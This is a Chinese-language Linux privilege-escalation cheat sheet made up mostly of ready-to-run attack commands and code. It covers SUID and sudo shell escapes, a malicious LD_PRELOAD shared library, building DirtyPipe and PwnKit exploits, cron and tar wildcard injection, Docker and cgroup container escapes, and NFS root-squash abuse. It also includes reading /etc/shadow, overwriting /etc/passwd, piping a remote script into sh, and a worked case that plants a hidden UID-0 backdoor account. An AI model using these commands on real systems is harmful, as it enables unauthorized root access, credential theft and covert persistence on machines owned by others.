# Linux 提权手法速查手册

---

## 📋 目录

1. [提权方法论](#一提权方法论)
2. [信息收集](#二信息收集)
3. [SUID 提权](#三suid-提权)
4. [sudo 滥用提权](#四sudo-提权)
5. [内核漏洞提权](#五内核漏洞提权)
6. [计划任务提权](#六计划任务提权)
7. [Docker 逃逸](#七docker-逃逸)
8. [Capabilities 提权](#八capabilities)
9. [NFS 提权](#九nfs-提权)
10. [MySQL UDF 提权](#十mysql-udf)
11. [完整案例](#十一完整案例)

---

## 一、提权方法论

```
Linux 提权 = 从低权限用户 → root

提权流程：
  Step 1: 信息收集 → 枚举所有可能的提权向量
  Step 2: 策略排序 → 从最可能到最不可能
  Step 3: 逐项测试 → 直到找到可用的提权路径
  
常见提权向量（按可能性排序）：
  ① sudo -l              → 可直接提权的命令
  ② SUID 文件            → find/vim/bash/python
  ③ 内核漏洞             → DirtyCow/DirtyPipe
  ④ 计划任务             → 可写cron脚本
  ⑤ 可写 /etc/passwd     → 添加root用户
  ⑥ 敏感文件             → 配置文件含密码
  ⑦ Capabilities         → cap_sys_admin等
  ⑧ Docker 组             → 容器逃逸
```

---

## 二、信息收集

```bash
# ===== 1. 一键收集脚本 =====
# LinPEAS — 最全面的 Linux 提权信息收集
# https://github.com/carlospolop/PEASS-ng
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum — 轻量版提权枚举
# https://github.com/rebootuser/LinEnum

# ===== 2. 手工信息收集 =====
# 系统信息
uname -a                          # 内核版本（寻找内核exploit）
cat /etc/os-release               # 发行版
hostname                          # 主机名

# 当前用户
whoami && id
sudo -l                           # ★最重要！sudo权限
cat /etc/passwd | grep -v nologin # 可登录用户

# 网络
ifconfig -a || ip a
netstat -tlnp || ss -tlnp        # 监听端口(可能有内网服务)
route -n                           # 路由表
cat /etc/hosts                     # DNS配置

# 进程
ps auxf                           # 进程树
# 寻找以root运行的进程(可能可写/可利用)

# 文件系统
find / -writable -type f 2>/dev/null | grep -v /proc
# 可写文件(尤其是/etc下的)
find / -perm -4000 -type f 2>/dev/null  # ★SUID文件
find / -perm -2000 -type f 2>/dev/null  # SGID文件
cat /etc/fstab                     # 挂载信息(看是否有NFS)

# 凭据搜索
grep -rni "password" /var/www/ --include="*.php" 2>/dev/null
grep -rni "DB_PASSWORD" /etc/ 2>/dev/null
find / -name ".env" -o -name "config.php" -o -name "wp-config.php" 2>/dev/null
cat ~/.bash_history 2>/dev/null

# 计划任务
crontab -l
cat /etc/crontab
ls -la /etc/cron.*/
```

---

## 三、SUID 提权

### 3.1 原理

```
SUID (Set User ID) = 以文件所有者的权限执行
  -rwsr-xr-x 1 root root /usr/bin/passwd
   ↑ s = SUID，执行时以 root 身份运行

攻击：如果 SUID 文件可被利用(如 find/vim/bash/python)
→ 可以用它来执行任意命令 → 以 root 身份
```

### 3.2 经典 SUID 提权

```bash
# === 枚举 SUID 文件 ===
find / -perm -4000 -type f 2>/dev/null

# === 1. find 提权 ===
# 如果 /usr/bin/find 有 SUID
find . -exec /bin/sh -p \; -quit
# -p 保持euid(root)
# → root shell!

# === 2. vim 提权 ===
# vim 有 SUID
vim -c ':!/bin/sh'
# 或: vim → :set shell=/bin/sh → :shell

# === 3. bash 提权 ===
# bash 有 SUID (罕见但致命)
/bin/bash -p
# → root shell

# === 4. python 提权 ===
# python 有 SUID 且支持 -c
python -c 'import os; os.setuid(0); os.system("/bin/bash")'

# === 5. less/more 提权 ===
less /etc/passwd
# 按 ! 进入命令模式 → 输入 /bin/bash

# === 6. cp/mv 提权 ===
# 可以覆盖 /etc/passwd 或 /etc/shadow
# Step 1: 创建新的 passwd 文件(含 root 用户 + 已知密码)
openssl passwd -1 password123  # 生成密码哈希
echo "hacker:\$1\$xxx:0:0:root:/root:/bin/bash" >> /tmp/newpasswd
# Step 2: 用 SUID cp 替换
cp /tmp/newpasswd /etc/passwd
# Step 3: su hacker → 输入 password123 → root!

# === 7. nmap 提权 ===
# nmap 有 SUID (旧版本2.02-5.21支持 --interactive)
nmap --interactive
!sh
# → root shell

# === 8. awk 提权 ===
awk 'BEGIN {system("/bin/bash")}'
```

---

## 四、sudo 滥用提权

### 4.1 sudo -l 结果分析

```bash
sudo -l

# 典型可提权配置：

# ① 可执行任意命令
# (ALL) ALL 或 (root) ALL → 直接 sudo su

# ② 可执行特定命令但无密码
(user) NOPASSWD: /usr/bin/vim
# → sudo vim -c ':!/bin/sh'

# ③ 可执行但不限制参数
(user) /usr/bin/find
# → sudo find . -exec /bin/bash \;

# ④ env_keep (保留环境变量)
env_keep+=LD_PRELOAD
# → 编译恶意.so → LD_PRELOAD=/tmp/evil.so sudo xxx
```

### 4.2 GTFOBins 速查

```
GTFOBins (https://gtfobins.github.io) 
= sudo 可滥用二进制文件大全

常用 sudo 提权命令：

sudo vim -c ':!/bin/sh'
sudo find / -exec /bin/sh \;
sudo less /etc/hosts → !/bin/sh
sudo awk 'BEGIN {system("/bin/sh")}'
sudo python -c 'import pty;pty.spawn("/bin/sh")'
sudo perl -e 'exec "/bin/sh";'
sudo nmap --interactive → !sh
sudo man man → !/bin/sh
sudo git help config → !/bin/sh
sudo ftp → !/bin/sh
sudo tcpdump -i lo -w /dev/null -z /bin/sh
sudo zip /tmp/test.zip /etc/passwd -T --unzip-command="sh -c /bin/bash"
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

### 4.3 LD_PRELOAD 提权

```c
// shell.c — 恶意共享库
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
```

```bash
# 编译
gcc -fPIC -shared -o shell.so shell.c -nostartfiles

# 利用（前提: sudo -l 显示 env_keep+=LD_PRELOAD）
sudo LD_PRELOAD=/tmp/shell.so apache2
# → root shell
```

---

## 五、内核漏洞提权

### 5.1 知名内核 Exploit

| CVE | 名称 | 影响内核 | 成功率 |
|-----|------|---------|--------|
| CVE-2016-5195 | DirtyCow | 2.6.22 - 4.8.3 | ★★★★★ |
| CVE-2022-0847 | DirtyPipe | 5.8 - 5.16 | ★★★★★ |
| CVE-2017-1000112 | UFO | 4.4 - 4.14 | ★★★★ |
| CVE-2021-4034 | PwnKit | pkexec | ★★★★★ |
| CVE-2021-3156 | Sudo Baron | sudo 1.8-1.9 | ★★★★★ |
| CVE-2014-4014 | | 3.4 - 3.14 | ★★★ |
| CVE-2023-0386 | OverlayFS | 5.11 - 6.1 | ★★★★ |

### 5.2 实战：DirtyPipe

```bash
# CVE-2022-0847 DirtyPipe (影响 Linux 5.8-5.16)

# 1. 检查内核版本
uname -r
# 输出: 5.13.0 → 受影响！

# 2. 编译Exploit
git clone https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit
cd CVE-2022-0847-DirtyPipe-Exploit
gcc exploit.c -o exploit
./exploit

# 利用原理:
# 向任意只读文件注入数据
# → 向 /etc/passwd 注入新root用户
# → su → root!

# 如果 exploit 需要特定条件，尝试其他版本:
# https://github.com/r1is/CVE-2022-0847
# https://github.com/liamg/traitor (自动化提权)
```

### 5.3 实战：PwnKit

```bash
# CVE-2021-4034 PwnKit (pkexec 内存损坏)

# 检查是否存在
which pkexec
# /usr/bin/pkexec → 存在，测试!

# 编译Exploit
git clone https://github.com/berdav/CVE-2021-4034
cd CVE-2021-4034
make
./cve-2021-4034
# → #(root shell)!

# 影响范围：
# 几乎所有主流 Linux 发行版（2022年1月前）
# CentOS/Ubuntu/Debian/RHEL 等
```

---

## 六、计划任务提权

```bash
# === 1. 可写 cron 脚本 ===
ls -la /etc/cron.d/
ls -la /etc/cron.hourly/
ls -la /etc/cron.daily/
# 查找可写的脚本!

echo '#!/bin/bash' > /etc/cron.hourly/backup.sh
echo 'chmod +s /bin/bash' >> /etc/cron.hourly/backup.sh
# 等待 cron 执行 → /bin/bash 具有 SUID → /bin/bash -p

# === 2. 可写 cron 配置文件 ===
# /etc/crontab 可写
echo '* * * * * root chmod +s /bin/bash' >> /etc/crontab
# 等待1分钟

# === 3. 通配符注入 ===
# cron 脚本执行 tar czf /backup/web.tar.gz /var/www/*
# → 在 /var/www/ 下放置 --checkpoint=1 --checkpoint-action=exec=/bin/sh
# → tar 将文件名解释为参数 → 执行命令！
touch /var/www/--checkpoint=1
touch '/var/www/--checkpoint-action=exec=sh shell.sh'
echo 'chmod +s /bin/bash' > shell.sh
```

---

## 七、Docker 逃逸

```bash
# === 前提: 用户在 docker 组 ===
id
# uid=1000(user) gid=1000(user) groups=1000(user),999(docker)
# → 在 docker 组!

# === 方法1: 挂载宿主机根目录 ===
docker run -it -v /:/host alpine chroot /host /bin/bash
# → 宿主机 root!

# === 方法2: Privileged 容器 ===
docker run -it --privileged alpine /bin/sh
# 在容器内:
fdisk -l  # 查看宿主机磁盘
mkdir /tmp/host && mount /dev/sda1 /tmp/host
chroot /tmp/host /bin/bash
# → 宿主机 root!

# === 方法3: CVE-2022-0492 (cap_sys_admin + cgroup) ===
unshare -UrmC bash  # 创建新命名空间
# 挂载 cgroup + release_agent 提权
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo 'chmod +s /bin/bash' >> /cmd
chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
# → /bin/bash 获得 SUID → bash -p
```

---

## 八、Capabilities

```bash
# 查看当前进程 Capabilities
cat /proc/self/status | grep Cap
capsh --print

# 查找有特殊 Capabilities 的文件
getcap -r / 2>/dev/null

# === 危险 Capabilities ===

# cap_setuid+ep — 可以 setuid(0)
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# cap_sys_admin — 可执行大量特权操作(mount/modprobe等)
# cap_sys_ptrace — 可调试其他进程(注入root进程)
# cap_dac_read_search — 可读取任意文件(绕过文件权限)
# 读取 /etc/shadow
cat /etc/shadow

# cap_net_admin+ep — 可加载内核模块
# cap_sys_module — 可加载内核模块 → 加载恶意 .ko → root
```

---

## 九、NFS 提权

```bash
# NFS (Network File System) 提权
# 前提: /etc/exports 配置了 no_root_squash

# === 1. 检查 NFS 导出 ===
showmount -e 10.0.1.10
# /shared 10.0.1.0/24(rw,no_root_squash)
# → no_root_squash = 保留客户端的root权限!

# === 2. 攻击 ===
# 在攻击机上(root):
mkdir /tmp/nfs
mount -t nfs 10.0.1.10:/shared /tmp/nfs

# 制作 SUID bash
cp /bin/bash /tmp/nfs/bash_suid
chmod +s /tmp/nfs/bash_suid

# 在目标机上:
/shared/bash_suid -p
# → root shell!

# === 3. 或创建恶意文件 ===
cat > /tmp/nfs/root_shell.c << 'EOF'
#include <stdio.h>
int main() {
    setuid(0); setgid(0);
    system("/bin/bash");
}
EOF
gcc /tmp/nfs/root_shell.c -o /tmp/nfs/root_shell
chmod +s /tmp/nfs/root_shell

# 在目标机上: /shared/root_shell → root!
```

---

## 十、MySQL UDF

```bash
# UDF (User Defined Function) 提权
# 前提: MySQL root 权限(enough to create function)

# === 1. 确认 MySQL 权限 ===
mysql -u root -p
SELECT @@plugin_dir;
# /usr/lib/mysql/plugin/ → 需要写入此目录

# === 2. 编译 UDF ===
# 使用 raptor_udf2.c (MySQL UDF 提权)
# 或使用 sqlmap:
sqlmap -d "mysql://root:pass@localhost/mysql" --os-shell

# === 3. 原理 ===
# UDF 允许执行自定义函数
# sys_exec() — 执行系统命令
# sys_eval() — 执行命令并返回输出
```

---

## 十一、完整案例：WebShell → root

```
场景：获得 Web 服务器的 www-data 权限

Phase 1: 信息收集 (10分钟)
  ① uname -a → Linux 5.13.0 → 可能受 DirtyPipe 影响
  ② sudo -l → (ALL) NOPASSWD: /usr/bin/vim
     → ★可直接提权！
  ③ find / -perm -4000 2>/dev/null
     → /usr/bin/python3.8 有 SUID (cap_setuid+ep)
     → ★也可提权！

Phase 2: 提权 (1分钟)
  # 方法1: sudo vim
  sudo vim -c ':!/bin/bash'
  → # root!

  # 方法2: python SUID
  python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
  → # root!

Phase 3: 持久化
  useradd -o -u 0 -g 0 -M -s /bin/bash backup_admin
  passwd backup_admin
  # → 创建了 UID=0 的"隐藏"root账户

结论：
  从 webshell → root 仅用 11 分钟
  关键原因：
    ① vim 的无密码 sudo（运维为了方便）
    ② python SUID（可能是错误部署导致）
```

---

## ✅ 提权 Checklist

- [ ] 运行 LinPEAS / LinEnum
- [ ] `sudo -l` 检查
- [ ] SUID/SGID 文件检查
- [ ] 内核版本 → 匹配已知exploit
- [ ] 计划任务检查（可写脚本/可写crontab）
- [ ] 敏感文件搜索（.env/config/ssh密钥）
- [ ] Docker组检查
- [ ] Capabilities检查
- [ ] NFS检查（no_root_squash）
- [ ] PATH劫持
- [ ] 可写 /etc/passwd /etc/shadow
